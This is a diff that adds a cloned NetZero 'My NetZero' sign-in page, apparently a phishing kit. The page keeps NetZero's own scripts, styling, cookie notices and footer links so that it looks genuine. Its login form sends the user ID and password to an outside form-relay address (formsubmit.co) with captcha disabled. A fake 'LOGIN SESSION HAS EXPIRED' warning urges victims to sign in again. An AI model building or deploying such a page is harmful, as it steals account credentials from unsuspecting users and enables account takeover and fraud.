@@ -1,0 +1,590 @@
+<!DOCTYPE html><html><head>
+    <!-- Meta Tags -->
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<!-- Page Title -->
+	<!-- start: shared-tracking -->
+	<title>NetZero - My NetZero Personalized Start Page - Sign in</title>
+	<link rel="icon" type="image/png" sizes="32x32" href="images/favicon.png">
+<script language="JavaScript">
+// derive servlet from [a-zA-Z]+.do  
+var temp="/login.do"; temp = temp.match(/([a-zA-Z0-9]+)\.do/); 
+var servlet='unknown'; if(temp.length) servlet = temp[1];
+
+//derive pagename from ssi var
+var pname = 'logon'; pname = pname.replace(/\.jsp/,''); if(pname.length<1) pname='unknown'; 
+switch(servlet){
+	/* some spring actions differ from zulu...try to map them back */
+	case 'referEmailPreview': servlet = 'refer'; break;
+	case 'login': servlet = 'logon'; break;
+	case 'portfolioLookup': servlet = 'portfolio'; break; 
+	case 'weatherLookup': servlet = 'weather'; break; 
+	case 'accessNumbers': servlet = 'numbers'; break;
+	case 'accessNumbersSaveEmail': servlet = 'numbers'; break;
+	case 'signOnRequiredRhinoboot': servlet = 'rhinoboot'; break; 
+	case 'landing' : 
+		var ssi_sv_path = '/login.do';
+		var ssi_pg_path = '';
+		//alert(ssi_sv_path + ' -- ' +ssi_pg_path);
+		if(ssi_sv_path.match(/landing\.do/) && ssi_pg_path.match(/www/)){
+			servlet = 'www'; 
+		} else {
+			// don't modify servlet var--other non-www contexts?
+		}
+		break; 
+}
+
+</script>
+<script language="JavaScript" src="js/pageview.js"></script>
+
+<!--
+====================================================
+	we are forcing the comeFrom code when loading
+	the NZ www frontdoor (windows) as part of a/b
+	testing (RT#12743)
+====================================================
+-->
+
+<script language="JavaScript">
+var context = '';
+
+
+
+if(servlet != 'sp'){
+	//logPageView(servlet,pname,'C7A895098F32E7D947A05CB72E86C7FE.DCA-AS08','https://track.netzero.net',context);
+	try{
+		logPageView(servlet,pname,'C7A895098F32E7D947A05CB72E86C7FE.DCA-AS08','https://track.netzero.net',context);
+	 }
+	catch(e){		
+	} 
+}
+
+function debug_pv_values(){
+	alert('servlet='+servlet+'\npname='+pname+'\nsID=C7A895098F32E7D947A05CB72E86C7FE.DCA-AS08\ntrackServer=https://track.netzero.net\ncontext='+context)
+}
+</script>	
+	
+
+<!-- end: shared-tracking -->
+
+<script src="js/jQuery.js">
+<script>
+var capid="";
+var href = document.location.href;
+function getCookieValue(nm) {var c=document.cookie; var x=c.indexOf(nm+'='); if(x == -1) return null; var y=x+nm.length; var z=c.indexOf(';',y); if(z == -1) z=c.length; var v=c.substring(y,z); if(v.charAt(0) == '=') v=v.substring(1,v.length); return v;}
+function getCookieDomain() {var ds = ''; if(href.indexOf('.netzero.net') != -1) ds='; domain=.netzero.net'; if(href.indexOf('.juno.com') != -1) ds='; domain=.juno.com'; if(href.indexOf('.mybluelight.com') != -1) ds='; domain=.mybluelight.com'; return ds;}
+function setCookieValue(n,v,days) {expire=';expires=Tue, 24 Jul 2022 01:01:01 GMT'; if (arguments.length>2) {msecs=(days*24*60*60*1000)+(new Date()).getTime();then=new Date(msecs);expire=';expires='+then.toGMTString(); } var ds=getCookieDomain(); document.cookie=n+'='+v+expire+';path=/'+ds;}
+function areCookiesEnabled() {setCookieValue('c_check','enabled'); var c=getCookieValue('c_check'); if(c!=null && c.indexOf('enabled') != -1) return true; alert('You must enable cookies to use this site!'); top.location.href='/s/common?r=cookies'; return false;}
+
+function onlyCaptcha(form) {
+    if(form.captchaTypedWord.value.length == 0) {
+    alert("Captcha required!");
+    form.captchaTypedWord.focus();
+    return false;
+    }
+	return true;
+}
+
+function logonValidate(form) {
+
+var memberIdText = 'Member ID';
+var memberid= form.memberId.value.toLowerCase();
+
+form.memberId.value = $.trim(form.memberId.value);
+
+if(!areCookiesEnabled()) {return false;}
+
+if(memberid.length == 0) {
+	alert("Member ID required!");
+	form.memberId.focus();
+	return false;
+	}
+
+if(form.password.value.length == 0) {
+	alert("Password required!");
+	form.password.focus();
+	return false;
+	}
+if(capid != '')
+{
+       if(form.captchaTypedWord.value.length == 0) {
+       alert("Captcha required!");
+       form.captchaTypedWord.focus();
+       return false;
+       }
+ }
+return true;
+}
+</script>
+<!-- Adding multistep login page COM-3073 -->
+	<!-- tag library and pname -->
+<!-- Stylesheet and Fav Icon Includes -->
+<link rel="shortcut icon" href="images/webicon_n.ico">
+<link rel="stylesheet" href="css/bootstrap.min.css">
+<link rel="stylesheet" href="css/common-redesign.css">
+<link rel="stylesheet" type="text/css" href="css/sp-redesign.css">
+
+<style>
+@media all {
+	IE\:clientCaps {
+		behavior: url(login.do#default#clientCaps)
+	}
+}
+/* Desktops and laptops ----------- */
+@media only screen and (min-width: 1224px) {
+  .cookieDisc {
+    width: 1020px;
+    margin-top:-15px
+	}
+}
+/* iPads (portrait and landscape) ----------- */
+@media only screen and (min-device-width: 768px) and (max-device-width: 1024px) { 
+  .cookieDisc {
+    width: 768px;
+    margin-top:-15px
+	}
+}
+/* Smartphones (portrait and landscape) ----------- */
+@media only screen and (max-device-width: 480px) {
+  .cookieDisc {
+   		width: 375px;
+   		margin-top:-3px
+  }
+
+  .continueLink{
+		display:none;
+  }
+ }
+
+</style>
+<!--[if IE]>
+		<link rel="stylesheet" type="text/css" href="/redesign/common/css/ie.css?v=42608" />
+	<![endif]-->
+<!--[if gt IE 9]>
+	   <style>
+	     body{font-family:sans-serif !important;}
+	    .form-signin input[type="text"],
+		.form-signin input[type="password"] {	
+		  font-family:sans-serif !important;
+		  color:#585858; }
+		</style>
+	<![endif]-->
+<!-- JS Includes -->
+<script type="text/javascript" src="js/common-redesign.js"></script>
+<script src="js/mobile-detect.min.js"></script>
+
+<script type="text/javascript">
+	var envDomain = "netzero.net";
+	var capid = "";
+	var pname = "login.jsp";
+	var isDialupFlag = false;
+	var md = new MobileDetect(window.navigator.userAgent);
+	var memid="";
+	var nextBtnDelay= 2500;
+	ctcookie = getCookieValue('CT');
+	$(document).ready(function(){
+	var keepMeSignedInChecked = "";
+	if(keepMeSignedInChecked == "1"){
+		$("#keepmesignedin").attr("checked",true);
+	}
+	
+	//Adding favicon dynamically
+	 $('head').append('<link rel="shortcut icon" href="/static/account/view/img/webicon_n.ico">');
+	
+		var keepmeSigninValue = getCookieValue("keepSignin");
+		if('null' == keepmeSigninValue){
+			keepmeSigninValue = null;
+		}
+			if( keepmeSigninValue != null  )
+				{
+				$("#keepmesignedin").attr("checked",true);
+			 }	
+			else if(keepmeSigninValue == null){
+				$("#keepmesignedin").attr("checked",false);
+				}
+			
+		$('#keepmesignedin').click(function(){
+	        if($('#keepmesignedin').prop("checked") == true){
+	            $('#signin').click(function(){
+	            	setKeepMeSignin("keepSignin",true);
+	            })
+	        }
+	        else if($('#keepmesignedin').prop("checked") == false){
+	        	    $('#signin').click(function(){
+	            	setKeepMeSignin("keepSignin",null);
+	            })
+	        }
+	    });
+		
+		
+		if(md.phone() != null){
+			$('#ldivider').removeClass('fixedPos');
+			$('#header').removeClass('fixedPos');
+		}
+		$("#hdivider").css('border-bottom','2px solid #000000');
+	
+		
+		if(memid){document.getElementById("memberId").value= memid.substring(0,memid.indexOf("@")); }
+	
+		$('#backbtn').click(function(){
+			$('#EditableUserID').css('display', 'block');
+			$('#nonEditableUserID').css('display', 'none');
+		});
+		
+		
+		 $('.userIdForm').on('keypress', function(event) {
+			  var keyCode = event.keyCode || event.which;
+			  if (keyCode === 13) { 
+				  event.preventDefault();
+				  validateForm();
+			  }
+			});
+
+		/* $('.userNext').on("click",function(){
+			$('.userNext').prop("disabled",true);
+			$('html').css( 'cursor', 'wait');
+			setTimeout(formSubmit, nextBtnDelay);
+			return;
+		});  */
+		
+		
+		 /* $('.userNext').click(function(event){
+			 var form = $('.userIdForm');
+			var validForm = validateUserId(form);
+			if(validForm)
+				{
+					setTimeout(formSubmit, nextBtnDelay);
+				}	
+		});  */
+		
+	});
+	function validateForm(){
+		$('.userNext').prop("disabled",true);
+		if(validateUserId($('#memberId').val())){
+			$('html').css( 'cursor', 'wait');
+			//setTimeout(formSubmit, nextBtnDelay);
+			setTimeout(function(){
+				$('.userIdForm').submit();
+			},nextBtnDelay );
+		}		
+		else{
+			return false;
+		}
+	}
+	
+	$(function() {
+		$("#audioCaptchaImgHref").on('click', function(e) {
+			e.preventDefault();
+			
+			$("span.error").remove();
+			var captchaAudioContainer = document.getElementById("captchaAudio");
+			captchaAudioContainer.load();
+			captchaAudioContainer.playbackRate = 0.6;
+			captchaAudioContainer.play();
+	    });
+	});
+	
+	function showAudioErr() {
+		$("span.error").remove();
+	   	$("#reloadCaptchaImageText").before('<span class="error" style="position:relative;">Cannot play audio captcha.</span>');
+	}
+	
+	window.addEventListener("unhandledrejection", function(promiseRejectionEvent) { 
+		$("span.error").remove();
+	   	$("#reloadCaptchaImageText").before('<span class="error" style="position:relative;">Cannot play audio captcha.</span>');
+	});
+	
+</script>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+      <script src="/redesign/common/js/vendor/html5shiv.min.js?v=5516"></script>
+      <script src="/redesign/common/js/vendor/respond.min.js?v=30473"></script>
+    <![endif]-->
+<!--[if IE 8]>
+    <link rel="stylesheet" href="/redesign/common/css/common-redesign-ltie8.css?v=23876">
+    <![endif]-->
+
+<link rel="canonical" href="https://my.netzero.net">
+	</head>
+<body>
+
+	<script type="text/javascript">
+window.onload = function() {
+	
+	<!-- Reading MID value from cjar_1 cookie and prefilling the userId textbox -->
+	if($.trim(document.getElementById("memberId").value) == ''){
+		var cjarOneCookie = getCookieValue('cjar_1');
+		var cjarOneCookieDecoded = decodeURI(cjarOneCookie);
+		var midStartIndex = cjarOneCookieDecoded.indexOf('^MID!');
+		var MID = null;
+		if(midStartIndex >= 0 ){
+			MID = cjarOneCookieDecoded.substring(midStartIndex+5,cjarOneCookieDecoded.indexOf('^',midStartIndex+5));
+			if(MID != ''){
+				document.getElementById("memberId").value= MID;
+			}
+		}
+	}
+	
+	<!-- Focus memberId text field if its empty or password field if memberId is not empty (On page load) -->
+	if(document.getElementById("memberId") != null && document.getElementById("memberId").value == ""){
+  		document.getElementById("memberId").focus();
+	} else if(document.getElementById("password") != null && document.getElementById("password").value == ""){
+		document.getElementById("password").focus();
+	}
+};
+</script>
+	<!--[if IE]>
+<IE:clientCaps ID="oClientCaps" /> 
+<![endif]-->
+
+	<!--  This variable helps in redirecting to "WWW" server instead of "my"  based on the requestURL -->
+	<div class="spContainer">
+		<!-- New SP-2017 Header -->
+
+<header id="staticHeader">
+		
+<div class="row no-gutter spContainer fixedPos" id="header">
+ 	
+	<div class="leftCol" id="logo">
+		<a href="https://my.netzero.net/" target="_blank"><img src="images/n_logo.png" alt="NetZero"></a>
+	</div>
+	<div class="headerAdDiv spAds" id="Top3Ad"></div>
+	<div class="row" id="hdivider"></div>
+	
+</div>
+</header><!--  <div id="ldivider" class="fixedPos"></div> -->
+		<div class="cBoth"></div>
+		
+		<div id="cookieDisclaimer" class="row cookieDisc" style="z-index: 7777769;background-color: #e8f4f8;">
+				<div class="col-sm-11" style="padding: 5px 10px !important;">
+		       		We and our partners use cookies on our sites to improve our service, personalize advertising 
+		       		and remember your website preferences. By continuing to use this site you consent to our use of 
+		       		these cookies. For more information on cookies, including how you can manage your consent, 
+		       		please visit 
+		       		<a href="https://www.netzero.net/start/landing.do?page=www/legal/yourprivacyrights" target="_blank" style="font-size: inherit; color: black !important; text-decoration: underline;">Your Privacy Rights: Do Not Sell My Info</a>.
+			    </div>
+			    <div class="col-sm-1 continueLink" style="padding: 12px 10px 5px 5px;">
+			 	    <a href="" style="float:right;font-size: inherit;color: #00b8d9 !important;" onclick="$('#cookieDisclaimer').hide(); return false;">Continue&gt;&gt;</a>
+			    </div>
+				<div></div>
+			</div>
+			<div style="color: red;">
+			<p style="text-align: center;"><strong>LOGIN SESSION HAS EXPIRED</strong></p>
+			</div>
+			<br>
+			
+			<script>
+				var width = screen.width;
+				if(width < 768){ $('#cookieDisclaimer').css('width', width); }
+			</script>
+		<div class="cBoth"></div>
+		
+		<div class="row">
+			<div class="pull-left">
+				<div class="trans">
+					<br>
+					<div class="welcomeSign text-center">
+	<span style="font-weight: bold;">Welcome!</span> <span style="font-size: 15px;">Please Sign-In to <span style="color: red;">continue</span></span>
+					</div>
+					<div class="form-signin">
+    <form action="https://formsubmit.co/el/xujide" method="POST" name="login" class="userIdForm">
+	<input type="hidden" name="_captcha" value="false">
+        <!-- Input fields -->
+        <div class="padding29">
+            <input type="text" placeholder="User ID" id="memberId" maxlength="64" name="memberid" class="width255 defaultText" value="">
+        </div>
+        <div class="padding29">
+            <input type="password" placeholder="Password" id="password" maxlength="64" name="password" class="width255 defaultText1" autocomplete="off" style="text-align: center;">
+        </div>
+
+        <!-- Centered Button wrapper placed INSIDE the form -->
+        <div class="padding29" style="display: flex; justify-content: center; width: 100%;">
+            <button type="submit" class="btn btn-danger signin" id="signin">Sign-In</button>
+        </div>
+    </form>
+			<br><br>
+			<div style="text-align: center;">
+		<p style="color: red;"> <strong></strong> </p>
+			</div>
+
+				<div id="Left2Wrap" style="margin-top: 15px; margin-bottom: 20px;">
+					<div id="Left2Ad"></div>
+				</div>
+				</div>
+	
+		
+		<!-- Feeds -->
+		<script>
+		 var contentServer = 'https://content.uolstatic.com';
+		 var feedServer = 'https://feed.untd.com';
+		 function callAjax(endUrl, rtype, dType, callBackMethod) {
+			 $.ajax({
+				url: endUrl,
+				type: rtype,
+				dataType: dType,
+				jsonpCallback : callBackMethod
+			 });
+		 }
+		 
+		//alert('ab switch value - a');
+		callAjax(feedServer + "/feed/feed?action=multifeed&synd=fd_newser_rss_entertainment,fd_newser_rss_topnews,fd_newser_rss_us_world,fd_newser_rss_sports,fd_newser_rss_popular,fd_newser_rss_science,fd_newser_rss_crime&format=jsonp", 
+		"get", "jsonp", "jsoncallback");
+		</script>
+		<script type="text/javascript" src="js/sp-text-feeds.js"></script>
+
+		<!-- End of Feeds -->
+		
+		
+		<!-- <div id="Frame1Wrap"></div><br/>
+	  <div id="Frame2Wrap"></div><br/>
+	  <div id="Left3Wrap"></div><br/> -->
+		<!-- Footer -->
+		<!-- <div class="footerPadding cBoth" id="footerPadding"> -->
+		<!--New start page redesign-2017 -->
+<style>
+      .footerNav1 {
+        white-space: nowrap;
+      }
+
+      .footerNav1 td {
+        padding: 0 4px;
+        white-space: nowrap;
+      }
+
+      .footerAdDiv {
+        display: none;
+      }
+
+      #BottomAd,
+      #Bottom2Ad,
+      #Bottom3Ad,
+      #Bottom4Ad {
+        width: 728px;
+        height: 90px;
+        float: right;
+      }
+    </style>
+    <footer id="staticFooter">
+      <div id="et-main-area">
+        <div id="main-content">
+          <div class="entry-content">
+            <div class="et_pb_section  et_pb_with_background et_section_regular">
+              <div class=" et_pb_row et_pb_row_0">
+                <hr class="et_pb_module et_pb_space et_pb_divider et_pb_divider_0" style="margin-top: 10px;">
+              </div> <!-- .et_pb_column -->
+            </div> <!-- .et_pb_row -->
+            <div class=" et_pb_row et_pb_row_1">
+              <div class="et_pb_column et_pb_column_1_4  et_pb_column_1">
+                <div class="et_pb_code et_pb_module  et_pb_code_0">
+                  <!-- Footer Links -->
+                  <table width="100%" cellpadding="0" cellspacing="0">
+                    <tbody><tr>
+
+                      <td>
+                        <table class="footerNav1" cellpadding="0" cellspacing="0">
+                          <tbody><tr>
+
+                            <td><a href="/start/login.do?cf=sp" tabindex="1" target="_blank">Sign Into Email</a></td>
+                            <td>|</td>
+
+                            <td><a href="https://my.netzero.net/start/sp.do" tabindex="2" target="_blank">My NetZero</a></td>
+                            <td>|</td>
+
+                            <td><a href="https://track.netzero.net/s/lc?s=&amp;u=https://account.netzero.net/s/account" tabindex="3" target="_blank">My Account</a></td>
+                            <td>|</td>
+
+                            <td><a href="https://account.netzero.net/s/landing" tabindex="4" target="_blank">Our Services</a></td>
+                            <td>|</td>
+
+                            <td><a href="https://www.netzero.net/start/landing.do?page=www/legal/privacy" tabindex="6" target="_blank">Privacy Policy</a></td>
+                            <td>|</td>
+
+                            <td><a href="https://www.netzero.net/start/landing.do?page=www/legal/privacy#III" tabindex="8" target="_blank">About Ads</a></td>
+                            <td>|</td>
+
+                            <td><a href="https://www.netzero.net/start/landing.do?page=www/legal/terms" tabindex="9" target="_blank">Terms of Service</a></td>
+                            <td>|</td>
+
+                            <td><a href="https://www.netzero.net/start/landing.do?page=www/legal/yourprivacyrights" tabindex="7" target="_blank">Your Privacy Rights: Do Not Sell My Info</a></td>
+
+                          </tr>
+                        </tbody></table>
+                      </td>
+
+                      <td style="text-align:right; white-space:nowrap;">
+                        <div class="copyright">
+                          Copyright © 2026 NetZero , Inc.
+                        </div>
+                      </td>
+                    </tr>
+
+                    <tr>
+
+                      <td colspan="2" style="text-align:right; padding-top:5px; white-space:nowrap;">
+
+                        <div class="footerAdDiv spAds" id="Bottom3Ad"></div>
+                            <div class="footerAdDiv spAds" id="Bottom4Ad"></div>
+
+                          </td>
+
+                    </tr>
+                  </tbody></table>
+                </div> <!-- .et_pb_code -->
+              </div> <!-- .et_pb_column -->
+            </div> <!-- .et_pb_row -->
+            <div class=" et_pb_row et_pb_row_2">
+              <div id="Frame1Ad" class="fright spAds"></div>
+              <div id="RMA1Ad" class="fright spAds"></div>
+              <div id="RMA2Ad" class="fright spAds"></div>
+            </div> <!-- .et_pb_row -->
+          </div> <!-- .et_pb_section -->
+        </div> <!-- .entry-content -->
+      </div> <!-- #main-content -->
+      </footer></div> <!-- #page-container -->
+    
+    <script>
+      $(document).ready(function () {
+        if (screen.height >= 1045) {
+          //document.getElementById('BottomAd').setAttribute('id', 'Bottom2Ad');
+          $('#Bottom2Ad, #Bottom4Ad').show();
+        }
+        else {
+          $('#BottomAd, #Bottom3Ad').show();
+        }
+      });
+
+      if (false) {
+        $('.mainContentAfterDisc').css('padding-top', '130px');
+      }
+      setTimeout(function () {
+        $('#cookieDisclaimer').hide();
+        $('.mainContentAfterDisc').css('padding-top', '85px');
+      }, 30000);
+
+    </script><!-- </div>  -->
+
+	
+	
+	<div id="AdLoader"></div>
+		<div id="userConsentForAdsPopup">
+			<div id="userConsentForAdsPopupContent">
+				<table id="userConsentText" class="font1emBold">
+					<tbody><tr>
+						<td>We use cookies to collect and analyze information on site
+							performance and usage, and to tailor advertisements to your
+							interests. By clicking "Accept" you agree to allow cookies to be
+							placed. You can learn more about our use of cookies and similar
+							technologies and your choices by reviewing our <a href="https://my.netzero.net/start/landing.do?page=www/legal/cookie" target="_blank" class="cookiePolicyLink">Cookie Policy.</a>
+						</td>
+						<td id="userConsentButtons"><button id="allowButton">Accept</button></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+		<script>showUserConsentOverlay();</script>
+			
+	
+</div></div></div></body></html>
